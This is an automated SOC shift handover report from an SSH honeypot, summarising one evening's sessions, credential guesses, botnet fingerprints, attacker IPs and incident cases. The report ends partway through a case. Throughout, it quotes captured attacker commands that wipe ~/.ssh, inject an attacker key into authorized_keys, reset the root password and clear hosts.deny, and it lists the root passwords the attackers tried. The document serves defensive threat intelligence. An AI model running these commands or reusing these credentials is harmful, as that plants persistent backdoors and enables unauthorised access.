# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-15 |
| **Generated At** | 2026-05-15T19:43:56Z |
| **Shift Time** | 19:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **126** |
| Confirmed Threats | **105** |
| False Positives Filtered | **21** (16.7%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **20** |
| High Severity Cases | **37** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **74** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **13** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 37 |
| `345gs5662d34` | 18 |
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | 5 |
| `Accept-Encoding: gzip` | 5 |
| `zhxnephu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `Host: 13.235.92.17:2223` | 5 |
| `Accept: */*` | 5 |
| `` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | `Accept: */*` | 5 |
| `Accept-Encoding: gzip` | `` | 5 |
| `root` | `123456789qq` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `tomas` | `77.239.111.233` | 2026-05-15T17:57:07 |
| `root` | `3245gs5662d34` | `77.239.111.233` | 2026-05-15T17:57:11 |
| `root` | `winston` | `197.225.146.23` | 2026-05-15T17:58:09 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-05-15T17:58:13 |
| `root` | `123456789qq` | `14.224.227.189` | 2026-05-15T17:59:35 |
| `root` | `3245gs5662d34` | `14.224.227.189` | 2026-05-15T17:59:38 |
| `root` | `123456789qq` | `152.32.169.153` | 2026-05-15T18:00:41 |
| `root` | `3245gs5662d34` | `152.32.169.153` | 2026-05-15T18:00:45 |
| `root` | `k0nig2022` | `113.194.203.31` | 2026-05-15T18:02:17 |
| `root` | `abc@123456` | `51.68.226.87` | 2026-05-15T18:04:03 |
| `root` | `3245gs5662d34` | `51.68.226.87` | 2026-05-15T18:04:07 |
| `root` | `redwings` | `51.68.226.87` | 2026-05-15T18:05:14 |
| `root` | `P@ssw0rd#123` | `51.68.226.87` | 2026-05-15T18:06:24 |
| `root` | `studio` | `51.68.226.87` | 2026-05-15T18:07:32 |
| `root` | `1941` | `51.68.226.87` | 2026-05-15T18:08:38 |
| `root` | `hentai` | `51.68.226.87` | 2026-05-15T18:10:47 |
| `root` | `nagios1234` | `51.68.226.87` | 2026-05-15T18:11:55 |
| `root` | `cake` | `51.68.226.87` | 2026-05-15T18:13:01 |
| `root` | `peter` | `51.68.226.87` | 2026-05-15T18:15:16 |
| `root` | `2036` | `51.68.226.87` | 2026-05-15T18:16:19 |
| `root` | `lucas123` | `51.68.226.87` | 2026-05-15T18:17:24 |
| `root` | `Admin_1234` | `51.68.226.87` | 2026-05-15T18:18:36 |
| `root` | `linux123` | `103.174.115.72` | 2026-05-15T18:30:09 |
| `root` | `3245gs5662d34` | `103.174.115.72` | 2026-05-15T18:30:14 |
| `root` | `Push@8240` | `43.134.188.32` | 2026-05-15T19:13:47 |
| `root` | `3245gs5662d34` | `43.134.188.32` | 2026-05-15T19:13:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **126** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 61 |
| OpenSSH | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 57 | 7 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |
| `b21d7cdcc813...` | Mirai/variant | 1 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 57 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `b21d7cdcc813...` | OpenSSH | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `c118de82e19e...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:5ICCC67QHDCQ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `113.194.203.31`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.134.188.32`, `14.224.227.189`, `152.32.169.153`, `197.225.146.23`, `77.239.111.233`, `51.68.226.87`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **27** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS13213` | THG HOSTING LIMITED | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS23889` | Mauritius Telecom Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (37)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be2b507e8aa4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.111[.]233` |
| **First Seen** | 2026-05-15 17:57 |
| **Last Seen** | 2026-05-15 17:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:57:06` | `cowrie.session.connect` |
| `2026-05-15 17:57:06` | `cowrie.client.version` |
| `2026-05-15 17:57:06` | `cowrie.client.kex` |
| `2026-05-15 17:57:07` | `cowrie.login.success` |
| `2026-05-15 17:57:07` | `cowrie.session.params` |
| `2026-05-15 17:57:07` | `cowrie.command.input` |
| `2026-05-15 17:57:07` | `cowrie.command.failed` |
| `2026-05-15 17:57:08` | `cowrie.log.closed` |
| `2026-05-15 17:57:08` | `cowrie.session.params` |
| `2026-05-15 17:57:08` | `cowrie.command.input` |
| `2026-05-15 17:57:08` | `cowrie.session.file_download` |
| `2026-05-15 17:57:08` | `cowrie.log.closed` |
| `2026-05-15 17:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.111[.]233` to AbuseIPDB if not already reported
- [ ] Block `77.239.111[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05033470ce6d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.111[.]233` |
| **First Seen** | 2026-05-15 17:57 |
| **Last Seen** | 2026-05-15 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:57:10` | `cowrie.session.connect` |
| `2026-05-15 17:57:10` | `cowrie.client.version` |
| `2026-05-15 17:57:11` | `cowrie.client.kex` |
| `2026-05-15 17:57:11` | `cowrie.login.success` |
| `2026-05-15 17:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.111[.]233` to AbuseIPDB if not already reported
- [ ] Block `77.239.111[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442ff9f5920a

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-05-15 17:58 |
| **Last Seen** | 2026-05-15 17:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:58:09` | `cowrie.session.connect` |
| `2026-05-15 17:58:09` | `cowrie.client.version` |
| `2026-05-15 17:58:09` | `cowrie.client.kex` |
| `2026-05-15 17:58:09` | `cowrie.login.success` |
| `2026-05-15 17:58:10` | `cowrie.session.params` |
| `2026-05-15 17:58:10` | `cowrie.command.input` |
| `2026-05-15 17:58:10` | `cowrie.command.failed` |
| `2026-05-15 17:58:10` | `cowrie.log.closed` |
| `2026-05-15 17:58:10` | `cowrie.session.params` |
| `2026-05-15 17:58:10` | `cowrie.command.input` |
| `2026-05-15 17:58:10` | `cowrie.session.file_download` |
| `2026-05-15 17:58:10` | `cowrie.log.closed` |
| `2026-05-15 17:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e108b5085669

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-05-15 17:58 |
| **Last Seen** | 2026-05-15 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:58:12` | `cowrie.session.connect` |
| `2026-05-15 17:58:12` | `cowrie.client.version` |
| `2026-05-15 17:58:12` | `cowrie.client.kex` |
| `2026-05-15 17:58:13` | `cowrie.login.success` |
| `2026-05-15 17:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-973cdd28dd02

| Field | Detail |
|---|---|
| **Source IP** | `14.224.227[.]189` |
| **First Seen** | 2026-05-15 17:59 |
| **Last Seen** | 2026-05-15 17:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:59:35` | `cowrie.session.connect` |
| `2026-05-15 17:59:35` | `cowrie.client.version` |
| `2026-05-15 17:59:35` | `cowrie.client.kex` |
| `2026-05-15 17:59:35` | `cowrie.login.success` |
| `2026-05-15 17:59:35` | `cowrie.session.params` |
| `2026-05-15 17:59:35` | `cowrie.command.input` |
| `2026-05-15 17:59:35` | `cowrie.command.failed` |
| `2026-05-15 17:59:36` | `cowrie.log.closed` |
| `2026-05-15 17:59:36` | `cowrie.session.params` |
| `2026-05-15 17:59:36` | `cowrie.command.input` |
| `2026-05-15 17:59:36` | `cowrie.session.file_download` |
| `2026-05-15 17:59:36` | `cowrie.log.closed` |
| `2026-05-15 17:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.227[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.224.227[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e965ff3a3413

| Field | Detail |
|---|---|
| **Source IP** | `14.224.227[.]189` |
| **First Seen** | 2026-05-15 17:59 |
| **Last Seen** | 2026-05-15 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 17:59:38` | `cowrie.session.connect` |
| `2026-05-15 17:59:38` | `cowrie.client.version` |
| `2026-05-15 17:59:38` | `cowrie.client.kex` |
| `2026-05-15 17:59:38` | `cowrie.login.success` |
| `2026-05-15 17:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.227[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.224.227[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46caaeb4cb11

| Field | Detail |
|---|---|
| **Source IP** | `152.32.169[.]153` |
| **First Seen** | 2026-05-15 18:00 |
| **Last Seen** | 2026-05-15 18:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:00:41` | `cowrie.session.connect` |
| `2026-05-15 18:00:41` | `cowrie.client.version` |
| `2026-05-15 18:00:41` | `cowrie.client.kex` |
| `2026-05-15 18:00:41` | `cowrie.login.success` |
| `2026-05-15 18:00:42` | `cowrie.session.params` |
| `2026-05-15 18:00:42` | `cowrie.command.input` |
| `2026-05-15 18:00:42` | `cowrie.command.failed` |
| `2026-05-15 18:00:42` | `cowrie.log.closed` |
| `2026-05-15 18:00:42` | `cowrie.session.params` |
| `2026-05-15 18:00:42` | `cowrie.command.input` |
| `2026-05-15 18:00:42` | `cowrie.session.file_download` |
| `2026-05-15 18:00:42` | `cowrie.log.closed` |
| `2026-05-15 18:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2fc3bdf8f44

| Field | Detail |
|---|---|
| **Source IP** | `152.32.169[.]153` |
| **First Seen** | 2026-05-15 18:00 |
| **Last Seen** | 2026-05-15 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:00:44` | `cowrie.session.connect` |
| `2026-05-15 18:00:44` | `cowrie.client.version` |
| `2026-05-15 18:00:44` | `cowrie.client.kex` |
| `2026-05-15 18:00:45` | `cowrie.login.success` |
| `2026-05-15 18:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec07c0ff29fe

| Field | Detail |
|---|---|
| **Source IP** | `113.194.203[.]31` |
| **First Seen** | 2026-05-15 18:02 |
| **Last Seen** | 2026-05-15 18:02 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:5ICCC67QHDCQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:02:17` | `cowrie.session.connect` |
| `2026-05-15 18:02:17` | `cowrie.client.version` |
| `2026-05-15 18:02:17` | `cowrie.client.kex` |
| `2026-05-15 18:02:17` | `cowrie.login.success` |
| `2026-05-15 18:02:18` | `cowrie.session.params` |
| `2026-05-15 18:02:18` | `cowrie.command.input` |
| `2026-05-15 18:02:18` | `cowrie.command.failed` |
| `2026-05-15 18:02:18` | `cowrie.log.closed` |
| `2026-05-15 18:02:18` | `cowrie.session.params` |
| `2026-05-15 18:02:18` | `cowrie.command.input` |
| `2026-05-15 18:02:18` | `cowrie.session.file_download` |
| `2026-05-15 18:02:18` | `cowrie.log.closed` |
| `2026-05-15 18:02:34` | `cowrie.session.params` |
| `2026-05-15 18:02:34` | `cowrie.command.input` |
| `2026-05-15 18:02:35` | `cowrie.log.closed` |
| `2026-05-15 18:02:35` | `cowrie.session.params` |
| `2026-05-15 18:02:35` | `cowrie.command.input` |
| `2026-05-15 18:02:35` | `cowrie.log.closed` |
| `2026-05-15 18:02:35` | `cowrie.session.params` |
| `2026-05-15 18:02:35` | `cowrie.command.input` |
| `2026-05-15 18:02:35` | `cowrie.session.file_download` |
| `2026-05-15 18:02:35` | `cowrie.log.closed` |
| `2026-05-15 18:02:36` | `cowrie.session.params` |
| `2026-05-15 18:02:36` | `cowrie.command.input` |
| `2026-05-15 18:02:36` | `cowrie.log.closed` |
| `2026-05-15 18:02:36` | `cowrie.session.params` |
| `2026-05-15 18:02:36` | `cowrie.command.input` |
| `2026-05-15 18:02:36` | `cowrie.log.closed` |
| `2026-05-15 18:02:37` | `cowrie.session.params` |
| `2026-05-15 18:02:37` | `cowrie.command.input` |
| `2026-05-15 18:02:37` | `cowrie.command.input` |
| `2026-05-15 18:02:37` | `cowrie.log.closed` |
| `2026-05-15 18:02:37` | `cowrie.session.params` |
| `2026-05-15 18:02:37` | `cowrie.command.input` |
| `2026-05-15 18:02:37` | `cowrie.log.closed` |
| `2026-05-15 18:02:37` | `cowrie.session.params` |
| `2026-05-15 18:02:37` | `cowrie.command.input` |
| `2026-05-15 18:02:37` | `cowrie.log.closed` |
| `2026-05-15 18:02:38` | `cowrie.session.params` |
| `2026-05-15 18:02:38` | `cowrie.command.input` |
| `2026-05-15 18:02:38` | `cowrie.log.closed` |
| `2026-05-15 18:02:38` | `cowrie.session.params` |
| `2026-05-15 18:02:38` | `cowrie.command.input` |
| `2026-05-15 18:02:38` | `cowrie.log.closed` |
| `2026-05-15 18:02:39` | `cowrie.session.params` |
| `2026-05-15 18:02:39` | `cowrie.command.input` |
| `2026-05-15 18:02:39` | `cowrie.log.closed` |
| `2026-05-15 18:02:39` | `cowrie.session.params` |
| `2026-05-15 18:02:39` | `cowrie.command.input` |
| `2026-05-15 18:02:39` | `cowrie.log.closed` |
| `2026-05-15 18:02:39` | `cowrie.session.params` |
| `2026-05-15 18:02:39` | `cowrie.command.input` |
| `2026-05-15 18:02:40` | `cowrie.log.closed` |
| `2026-05-15 18:02:40` | `cowrie.session.params` |
| `2026-05-15 18:02:40` | `cowrie.command.input` |
| `2026-05-15 18:02:40` | `cowrie.log.closed` |
| `2026-05-15 18:02:40` | `cowrie.session.params` |
| `2026-05-15 18:02:40` | `cowrie.command.input` |
| `2026-05-15 18:02:40` | `cowrie.log.closed` |
| `2026-05-15 18:02:41` | `cowrie.session.params` |
| `2026-05-15 18:02:41` | `cowrie.command.input` |
| `2026-05-15 18:02:41` | `cowrie.log.closed` |
| `2026-05-15 18:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.194.203[.]31` to AbuseIPDB if not already reported
- [ ] Block `113.194.203[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c251539fca

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:04 |
| **Last Seen** | 2026-05-15 18:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
